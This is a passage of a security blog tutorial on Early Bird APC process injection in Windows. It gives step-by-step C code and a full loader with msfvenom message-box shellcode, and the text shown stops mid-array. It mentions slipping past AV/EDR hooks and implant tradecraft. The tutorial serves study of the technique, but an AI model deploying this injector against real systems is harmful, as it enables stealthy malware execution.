preserveAspectRatio="xMidYMid meet" style="transform: rotate(11deg);"><polygon points="100,5 185,50 185,150 100,195 15,150 15,50" stroke="#ec4899" stroke-width="1.2" fill="none" opacity="0.25" stroke-dasharray="12,8"></polygon></svg><svg class="absolute -inset-44 w-[calc(100%+22rem)] h-[calc(100%+22rem)] pointer-events-none" viewBox="0 0 200 200" preserveAspectRatio="xMidYMid meet" style="transform: rotate(-7.7deg);"><polygon points="100,8 190,160 10,160" stroke="#60a5fa" stroke-width="1.2" fill="none" opacity="0.18" stroke-dasharray="10,6"></polygon></svg><div class="absolute w-4 h-4 rounded-full bg-pink-400/60 blur-[2px]" style="top: calc(50% + 81.0108px); left: calc(50% + 283.813px);"></div><div class="absolute w-3 h-3 rounded-full bg-blue-400/50 blur-[1px]" style="top: calc(50% + 211.734px); left: calc(50% + 70.6022px);"></div><div class="absolute w-3 h-3 rounded-full bg-purple-400/45 blur-[1px]" style="top: calc(50% + 215.073px); left: calc(50% - 120.91px);"></div><div class="absolute -top-14 -left-16 text-pink-400/40 font-mono text-6xl font-bold">&lt;</div><div class="absolute -top-14 -right-16 text-blue-400/40 font-mono text-6xl font-bold">/&gt;</div><div class="absolute -bottom-10 -left-16 text-purple-400/30 font-mono text-5xl font-bold">{</div><div class="absolute -bottom-10 -right-16 text-pink-400/30 font-mono text-5xl font-bold">}</div><h1 class="text-8xl md:text-9xl font-black mb-6 relative "><span class="relative inline-block" style="text-shadow: rgba(236, 72, 153, 0.4) 6px 6px 0px, rgba(59, 130, 246, 0.4) -6px -6px 0px;"><span class="text-transparent bg-clip-text bg-gradient-to-r from-pink-400 via-purple-400 to-blue-400">At0mXploit</span></span></h1><div class="relative inline-block mb-8"><svg class="absolute -inset-8 w-[calc(100%+4rem)] h-[calc(100%+4rem)]" viewBox="0 0 200 100"><path d="M 100 10 L 110 35 L 130 30 L 120 50 L 140 55 L 120 70 L 125 90 L 100 75 L 75 90 L 80 70 L 60 55 L 80 50 L 70 30 L 90 35 Z" fill="#ec4899" opacity="0.3"></path></svg><div class="relative bg-pink-400 border-4 border-black px-8 py-3 shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] rotate-[-2deg] hover:rotate-0 transition-transform"><p class="text-2xl md:text-3xl font-black text-black uppercase tracking-wider">Wannabe Hacker</p></div></div><p class="text-xl text-white font-black mb-8 max-w-2xl mx-auto" style="text-shadow: rgba(236, 72, 153, 0.5) 3px 3px 0px;">Breaking stuff for fun &amp; profit!<br><span class="text-purple-400">Also writing about it (sometimes) 💀</span></p><div class="inline-block bg-yellow-200 border-2 border-yellow-600 px-6 py-3 rotate-2 shadow-lg"><p class="text-black font-bold text-sm">Pwning and Chilling with <a href="https://deadcats.space/" target="_blank" rel="noopener noreferrer" class="text-purple-600 font-black underline">DEADCATS</a></p></div><div class="absolute -bottom-20 right-8 text-pink-400/40 font-black text-lg rotate-12">← TO ARMS</div><div class="absolute -bottom-16 -left-8 text-blue-400/40 font-black text-sm -rotate-12">💣 BOOM! 💣</div></div><div class="absolute top-20 right-12 bg-red-500 border-4 border-black px-3 py-2 rotate-12 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)] animate-wiggle"><p class="text-black font-black text-xs">DANGER!</p></div><div class="absolute bottom-28 left-8 bg-green-400 border-4 border-black p-2 -rotate-6 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]"><img src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%20fill='none'%3e%3cdefs%3e%3cfilter%20id='neon-cat-glow'%3e%3cfeGaussianBlur%20stdDeviation='2'%20result='coloredBlur'/%3e%3cfeMerge%3e%3cfeMergeNode%20in='coloredBlur'/%3e%3cfeMergeNode%20in='SourceGraphic'/%3e%3c/feMerge%3e%3c/filter%3e%3c/defs%3e%3cg%20filter='url(%23neon-cat-glow)'%3e%3c!--%20Ears%20--%3e%3cpath%20d='M%2022%2038%20L%2028%2015%20L%2038%2032'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3cpath%20d='M%2078%2038%20L%2072%2015%20L%2062%2032'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Inner%20ears%20--%3e%3cpath%20d='M%2026%2034%20L%2030%2020%20L%2036%2032'%20stroke='%23ff66b3'%20stroke-width='1.5'%20fill='none'%20opacity='0.5'%20stroke-linejoin='round'/%3e%3cpath%20d='M%2074%2034%20L%2070%2020%20L%2064%2032'%20stroke='%23ff66b3'%20stroke-width='1.5'%20fill='none'%20opacity='0.5'%20stroke-linejoin='round'/%3e%3c!--%20Head%20--%3e%3cellipse%20cx='50'%20cy='50'%20rx='28'%20ry='24'%20stroke='%23ff0080'%20stroke-width='3'%20fill='none'/%3e%3c!--%20X%20eyes%20(kawaii%20dead/chaos%20eyes)%20--%3e%3cg%20stroke='%23ff0080'%20stroke-width='2.5'%20stroke-linecap='round'%3e%3cline%20x1='36'%20y1='42'%20x2='44'%20y2='50'/%3e%3cline%20x1='44'%20y1='42'%20x2='36'%20y2='50'/%3e%3cline%20x1='56'%20y1='42'%20x2='64'%20y2='50'/%3e%3cline%20x1='64'%20y1='42'%20x2='56'%20y2='50'/%3e%3c/g%3e%3c!--%20Nose%20--%3e%3cpath%20d='M%2048%2055%20L%2050%2058%20L%2052%2055'%20stroke='%23ff0080'%20stroke-width='2'%20fill='none'%20stroke-linejoin='round'/%3e%3c!--%20Mouth%20(w%20shape%20%E2%80%94%20kawaii%20cat%20mouth)%20--%3e%3cpath%20d='M%2040%2060%20Q%2045%2065,%2050%2060%20Q%2055%2065,%2060%2060'%20stroke='%23ff0080'%20stroke-width='2'%20fill='none'%20stroke-linecap='round'/%3e%3c!--%20Whiskers%20--%3e%3cline%20x1='20'%20y1='52'%20x2='35'%20y2='55'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3cline%20x1='20'%20y1='58'%20x2='35'%20y2='58'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3cline%20x1='65'%20y1='55'%20x2='80'%20y2='52'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3cline%20x1='65'%20y1='58'%20x2='80'%20y2='58'%20stroke='%23ff0080'%20stroke-width='1.5'%20opacity='0.7'/%3e%3c/g%3e%3c/svg%3e" alt="cat icon" class="neon-icon w-6 h-6"></div><div class="absolute top-60 left-[18%] w-1 h-24 bg-gradient-to-b from-pink-400/60 to-transparent"></div><div class="absolute top-80 right-[25%] w-1 h-16 bg-gradient-to-b from-blue-400/60 to-transparent"></div></section><div data-grimoire-root="true"></div><div data-grimoire-post-root="true">
+    <article class="py-24 px-6 relative min-h-screen" data-grimoire-post-shell="">
+      <div class="fixed top-3 left-4 right-4 z-[9999] h-3 bg-black/85 border-2 border-white/80 rounded-full pointer-events-none">
+        <div data-reading-progress="" class="h-full w-0 rounded-full bg-gradient-to-r from-pink-400 via-yellow-400 to-blue-400 transition-[width] duration-150 shadow-[0_0_14px_rgba(244,114,182,0.9)]" style="width: 0%;"></div>
+      </div>
+      <div class="absolute top-40 right-[8%] w-80 h-80 bg-pink-500/10 rounded-full blur-3xl"></div>
+      <div class="absolute bottom-20 left-[10%] w-72 h-72 bg-blue-500/10 rounded-full blur-3xl"></div>
+      <div class="max-w-7xl mx-auto">
+        <div class="relative bg-gray-900/60 border-8 border-black p-8 md:p-12 shadow-[12px_12px_0px_0px_rgba(0,0,0,1)] mb-12" data-tilt="" data-tilt-lift="translateY(-4px)" data-tilt-bound="true" data-base-transform="" style="transform-style: preserve-3d; will-change: transform; transition: transform 160ms;">
+          <div class="absolute -top-6 -right-6 w-32 h-32 bg-pink-400 rounded-full blur-2xl opacity-40"></div>
+          <div class="flex items-center gap-4 mb-6 flex-wrap">
+            
+              <div class="bg-black border-2 border-white px-4 py-2">
+                <span class="text-white font-black text-sm uppercase">2026-05-17</span>
+              </div>
+            
+            <div class="bg-white border-3 border-black px-4 py-2">
+              <span class="font-black text-black text-sm">6 min read</span>
+            </div>
+            <div class="bg-pink-400 border-4 border-black px-4 py-2 rotate-[-2deg]">
+              <span class="text-black font-black text-sm uppercase">Blogs</span>
+            </div>
+            
+          </div>
+          <div class="mb-8">
+            <div>
+              <h1 class="text-4xl md:text-6xl font-black text-white mb-4" style="text-shadow:6px 6px 0px rgba(0,0,0,0.5)">Queue Early Bird Injection</h1>
+              <div class="flex flex-wrap gap-3">
+                
+                      <div style="transform: rotate(-2deg)" class="bg-white border-3 border-black px-4 py-2 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)]">
+                        <span class="font-black text-black">#Process-Injection</span>
+                      </div>
+                    
+                      <div style="transform: rotate(2deg)" class="bg-white border-3 border-black px-4 py-2 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)]">
+                        <span class="font-black text-black">#Windows</span>
+                      </div>
+                    
+                      <div style="transform: rotate(-2deg)" class="bg-white border-3 border-black px-4 py-2 shadow-[3px_3px_0px_0px_rgba(0,0,0,1)]">
+                        <span class="font-black text-black">#APC</span>
+                      </div>
+                    
+              </div>
+            </div>
+          </div>
+        </div>
+        
+    
+  
+        <div class="markdown-content prose prose-invert prose-pink max-w-none" data-post-content="">
+          <div class="bg-gray-900/40 border-4 border-gray-700 p-8 md:p-12 shadow-lg"><h1 id="asynchronous-procedure-call-apc" class="text-4xl md:text-6xl font-black text-white mb-4" style="text-shadow:6px 6px 0px rgba(0,0,0,0.5)">Asynchronous Procedure Call (APC)</h1><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><img src="https://at0mxploit.xyz/posts/img/EarlyBirdCover.png" alt="" class="block my-8 mx-auto max-w-full h-auto border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]" loading="lazy"></p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">An APC is a Windows mechanism that allows a function to be queued for execution in context of specific thread. When a thread enters an alertable state (by calling functions like <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">SleepEx</code>, <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">WaitForSingleObjectsEx</code>, <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">MsgWaitForMultipleObjects</code> etc...), the Windows kernel checks if there are any pending APC queued to that thread and executes them. There is two types of APCs.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><img src="https://at0mxploit.xyz/posts/img/APC.png" alt="" class="block my-8 mx-auto max-w-full h-auto border-4 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0,1)]" loading="lazy"></p><ol class="list-decimal list-inside text-gray-100 space-y-3 mb-6 ml-2"><li class="text-lg font-medium leading-relaxed"><strong>User-mode APC</strong> which is executed in user context, this is what we care about in this blog.</li><li class="text-lg font-medium leading-relaxed"><strong>Kernel-mode APC</strong> which is executed in kernel context, used by OS itself.</li></ol><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">They key user-mode API is:</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm">DWORD <span style="color:#d8b4fe">QueueUserAPC</span>(
+    PAPCFUNC pfnAPC,      <span style="color:#6b7280;font-style:italic">// pointer to the APC function (our shellcode)</span>
+    HANDLE   hThread,     <span style="color:#6b7280;font-style:italic">// target thread</span>
+    ULONG_PTR dwData      <span style="color:#6b7280;font-style:italic">// parameter passed to APC function</span>
+);</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">This above queues a function to execute the next time the target thread enters an alertable state.</p><h1 id="regular-apc-injection-and-early-bird" class="text-4xl md:text-6xl font-black text-white mb-4" style="text-shadow:6px 6px 0px rgba(0,0,0,0.5)">Regular APC Injection and Early Bird</h1><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Regular APC injection targets on <strong>already running</strong> thread in an existing process. The problem is that the thread must enter an alertable state on its own, you can't force it. If thread never calls <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">SleepEx</code> or similar, APC never runs. It's reliable in practice but yeh not guaranteed. Early bird solves this by creating a process in a suspended state before it has finished initializing. At this point the main thread has not run a single instruction of executable yet and AV or EDR hooks injected via <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">DLL_PROCESS_ATTACH</code> may not have fired yet so we control exactly when execution resumes.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">We can queue the APC before the thread ever runs, then resume it. The very first thing the thread will do when it start is execute the shellcode. Hence the name <strong>Early Bird</strong>.</p><h2 id="early-bird" class="text-3xl font-black text-yellow-400 mt-14 mb-6 pt-4" style="text-shadow:4px 4px 0px rgba(0,0,0,0.5)">Early Bird</h2><div class="my-8 overflow-x-auto"><svg width="100%" viewBox="0 0 680 720" role="img" xmlns="http://www.w3.org/2000/svg">
+  <title>Early Bird APC injection flow</title>
+  <desc>Six sequential steps showing how Early Bird APC injection works.</desc>
+  <defs>
+    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+    </marker>
+  </defs>
+
+  <text x="340" y="34" text-anchor="middle" font-family="sans-serif" font-size="16" font-weight="500" fill="#2C2C2A">Early bird APC flow</text>
+
+  <!-- Step 1: CreateProcess -->
+  <rect x="160" y="60" width="360" height="64" rx="8" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"></rect>
+  <text x="340" y="84" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#2C2C2A">CreateProcess(CREATE_SUSPENDED)</text>
+  <text x="340" y="104" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#5F5E5A">Main thread frozen, no code executed</text>
+  <line x1="340" y1="124" x2="340" y2="156" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"></line>
+
+  <!-- Step 2: VirtualAllocEx -->
+  <rect x="160" y="160" width="360" height="64" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"></rect>
+  <text x="340" y="184" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#0C447C">VirtualAllocEx</text>
+  <text x="340" y="204" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#185FA5">Allocate RWX memory in target</text>
+  <line x1="340" y1="224" x2="340" y2="256" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"></line>
+
+  <!-- Step 3: WriteProcessMemory -->
+  <rect x="160" y="260" width="360" height="64" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"></rect>
+  <text x="340" y="284" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#0C447C">WriteProcessMemory</text>
+  <text x="340" y="304" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#185FA5">Write shellcode into allocation</text>
+  <line x1="340" y1="324" x2="340" y2="356" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"></line>
+
+  <!-- Step 4: QueueUserAPC -->
+  <rect x="160" y="360" width="360" height="64" rx="8" fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"></rect>
+  <text x="340" y="384" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#3C3489">QueueUserAPC</text>
+  <text x="340" y="404" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#534AB7">Queue shellcode to suspended thread</text>
+  <line x1="340" y1="424" x2="340" y2="456" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"></line>
+
+  <!-- Step 5: ResumeThread -->
+  <rect x="160" y="460" width="360" height="64" rx="8" fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"></rect>
+  <text x="340" y="484" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#3C3489">ResumeThread</text>
+  <text x="340" y="504" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#534AB7">Thread runs pending APC first</text>
+  <line x1="340" y1="524" x2="340" y2="556" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"></line>
+
+  <!-- Step 6: Shellcode executes -->
+  <rect x="120" y="560" width="440" height="64" rx="8" fill="#FAECE7" stroke="#993C1D" stroke-width="0.5"></rect>
+  <text x="340" y="584" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#712B13">Shellcode executes</text>
+  <text x="340" y="604" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#993C1D">Runs inside legitimate-looking process</text>
+</svg></div><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">The suspended thread is in special state where it will treat any queued APC as immediately pending. The moment <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ResumeThread</code> is called, before the process entry point runs, the APC dispatcher fires first.</p><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">Every thread in Windows has an <strong>APC queue</strong>, basically a linked list maintained in the kernel's <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">KTHREAD</code> structure. When <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">QueueUserAPC</code> is called, it adds a <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">KAPC</code> object to that list.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm">KTHREAD
+├── ApcState
+│   ├── ApcListHead[KernelMode]  
+│   └── ApcListHead[UserMode]    
+└── ...</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">When a thread is resumed from suspension, the kernels checks <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ApcState.ApcListHead[UserMode]</code>. If entries exist, it delivers them before handing control to the thread's normal execution path. This is the reason for working of Early Bird, the APC list is checked on resume, not just on alertable waits. The <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">PAPCFUNC</code> prototype Windows expects is:</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm">VOID CALLBACK <span style="color:#d8b4fe">APCProc</span>(ULONG_PTR dwParam);</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">When we cast our shellcode address to <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">PAPCFUNC</code>, Windows calls it with single parameter. Shellcode written for this doesn't use the parameter so it's fine to pass <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">NULL</code>. Ok now we understand the basics let's do it step by step.</p><h3 id="spawn-the-target-process-suspended" class="text-2xl font-black text-pink-400 mt-10 mb-4">Spawn the Target Process Suspended</h3><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">We can create <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">cmd.exe</code> in a suspended state using <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">CREATE_SUSPENDED</code>. At this point the process exists in memory with a valid PEB and address space, but the main thread has not executed a single instruction.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm">STARTUPINFOA si = { <span style="color:#f472b6;font-weight:600">sizeof</span>(si) };
+PROCESS_INFORMATION pi = { <span style="color:#67e8f9">0</span> };
+
+<span style="color:#d8b4fe">CreateProcessA</span>(
+    <span style="color:#4ade80">"C:\\Windows\\System32\\cmd.exe"</span>,
+    <span style="color:#93c5fd;font-weight:600">NULL</span>, <span style="color:#93c5fd;font-weight:600">NULL</span>, <span style="color:#93c5fd;font-weight:600">NULL</span>,
+    FALSE,
+    CREATE_SUSPENDED,   
+    <span style="color:#93c5fd;font-weight:600">NULL</span>, <span style="color:#93c5fd;font-weight:600">NULL</span>,
+    &amp;si, &amp;pi
+);
+
+<span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] cmd.exe spawned suspended. PID: %lu\n"</span>, pi.dwProcessId);</code></pre><h3 id="allocate-memory-in-the-target-process" class="text-2xl font-black text-pink-400 mt-10 mb-4">Allocate Memory in the Target Process</h3><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">We need a place inside the target process's address space to write our shellcode. <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">VirtualAllocEx</code> allocates memory in a remote process.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm">SIZE_T shellSize = <span style="color:#f472b6;font-weight:600">sizeof</span>(buf);
+
+LPVOID shellAddress = <span style="color:#d8b4fe">VirtualAllocEx</span>(
+    pi.hProcess,            <span style="color:#6b7280;font-style:italic">// handle to remote process</span>
+    <span style="color:#93c5fd;font-weight:600">NULL</span>,                   <span style="color:#6b7280;font-style:italic">// let OS choose address</span>
+    shellSize,              <span style="color:#6b7280;font-style:italic">// size of allocation</span>
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE  
+);
+
+<span style="color:#f472b6;font-weight:600">if</span> (!shellAddress) {
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] VirtualAllocEx failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+    <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+}
+
+<span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Shellcode allocated at: %p\n"</span>, shellAddress);</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed"><code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">PAGE_EXECUTE_READWRITE</code> is a strong IOC. No legitimate allocation in a normal process is both writable and executable. In a real implant we would write with <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">PAGE_READWRITE</code>, then flip to <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">PAGE_EXECUTE_READ</code> using <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">VirtualProtectEx</code> after writing. For this demo we keep it simple.</p><h3 id="write-shellcode-into-allocated-memory" class="text-2xl font-black text-pink-400 mt-10 mb-4">Write Shellcode into Allocated Memory</h3><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm">SIZE_T bytesWritten = <span style="color:#67e8f9">0</span>;
+
+BOOL ok = <span style="color:#d8b4fe">WriteProcessMemory</span>(
+    pi.hProcess,        <span style="color:#6b7280;font-style:italic">// remote process handle</span>
+    shellAddress,       <span style="color:#6b7280;font-style:italic">// destination (the allocation above)</span>
+    buf,                <span style="color:#6b7280;font-style:italic">// our shellcode bytes</span>
+    shellSize,          <span style="color:#6b7280;font-style:italic">// number of bytes to write</span>
+    &amp;bytesWritten
+);
+
+<span style="color:#f472b6;font-weight:600">if</span> (!ok || bytesWritten != shellSize) {
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] WriteProcessMemory failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+    <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+}
+
+<span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Wrote %zu bytes of shellcode\n"</span>, bytesWritten);</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">The shellcode bytes now live inside <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">cmd.exe</code>'s virtual address space at <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">shellAddress</code>. The process still hasn't run anything and the main thread is still suspended.</p><h3 id="queue-the-apc" class="text-2xl font-black text-pink-400 mt-10 mb-4">Queue the APC</h3><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">This is the core of the technique. We queue the shellcode address as an APC function on the main thread of the suspended process.</p><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm"><span style="color:#6b7280;font-style:italic">// Cast shellcode address to APC function pointer type</span>
+PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+
+DWORD result = <span style="color:#d8b4fe">QueueUserAPC</span>(
+    (PAPCFUNC)apcRoutine,   <span style="color:#6b7280;font-style:italic">// function to queue</span>
+    pi.hThread,             <span style="color:#6b7280;font-style:italic">// target thread (main thread, currently suspended)</span>
+    <span style="color:#93c5fd;font-weight:600">NULL</span>                    <span style="color:#6b7280;font-style:italic">// parameter (shellcode ignores this)</span>
+);
+
+<span style="color:#f472b6;font-weight:600">if</span> (!result) {
+    <span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[-] QueueUserAPC failed: %lu\n"</span>, <span style="color:#d8b4fe">GetLastError</span>());
+    <span style="color:#f472b6;font-weight:600">return</span> <span style="color:#67e8f9">1</span>;
+}
+
+<span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] APC queued to main thread\n"</span>);</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">The APC is now sitting in the kernel's <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ApcListHead[UserMode]</code> queue attached to <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">pi.hThread</code>.</p><h3 id="resume-the-thread" class="text-2xl font-black text-pink-400 mt-10 mb-4">Resume the Thread</h3><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm"><span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[*] Press ENTER to resume and execute shellcode...\n"</span>);
+<span style="color:#d8b4fe">getchar</span>(); 
+
+<span style="color:#d8b4fe">ResumeThread</span>(pi.hThread);
+
+<span style="color:#d8b4fe">printf</span>(<span style="color:#4ade80">"[+] Thread resumed. Shellcode executing\n"</span>);</code></pre><p class="text-lg font-medium text-gray-100 mb-6 leading-relaxed">When <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">ResumeThread</code> is called, the kernel transitions the thread from suspended to runnable. Before the thread's normal execution path begins (before the process entry point), the kernel's APC delivery mechanism fires. It sees our queued APC and calls <code class="bg-black/50 border border-gray-600 px-2 py-1 rounded text-pink-400 font-mono text-sm">shellAddress</code> directly.</p><h3 id="full-code" class="text-2xl font-black text-pink-400 mt-10 mb-4">Full Code</h3><pre class="bg-black/70 border-2 border-gray-600 p-6 my-8 overflow-x-auto rounded"><code class="language-c font-mono text-sm"><span style="color:#9ca3af;font-style:italic">#define _WIN32_WINNT 0x0600</span>
+
+<span style="color:#9ca3af;font-style:italic">#include &lt;windows.h&gt;</span>
+<span style="color:#9ca3af;font-style:italic">#include &lt;stdio.h&gt;</span>
+
+<span style="color:#6b7280;font-style:italic">// pops "Hello from Early Bird!" / "APC Injection"</span>
+<span style="color:#6b7280;font-style:italic">// Generated: msfvenom -p windows/x64/messagebox TEXT="Hello from Early Bird!" TITLE="APC Injection" -f c</span>
+<span style="color:#f472b6;font-weight:600">unsigned</span> <span style="color:#f472b6;font-weight:600">char</span> buf[] =
+<span style="color:#4ade80">"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"</span>
+<span style="color:#4ade80">"\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b"</span>
+<span style="color:#4ade80">"\x52\x18\x51\x56\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"</span>
+<span style="color:#4ade80">"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"</span>
+<span style="color:#4ade80">"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"</span>
+<span style="color:#4ade80">"\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"</span>
+<span style="color:#4ade80">"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"</span>
+<span style="color:#4ade80">"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"</span>
+<span style="color:#4ade80">"\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"</span>
+<span style="color:#4ade80">"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"</span>
+<span style="color:#4ade80">"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"</span>
+<span style="color:#4ade80">"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"</span>
+<span style="color:#4ade80">"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"</span>
+<span style="color:#4ade80">"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"</span>
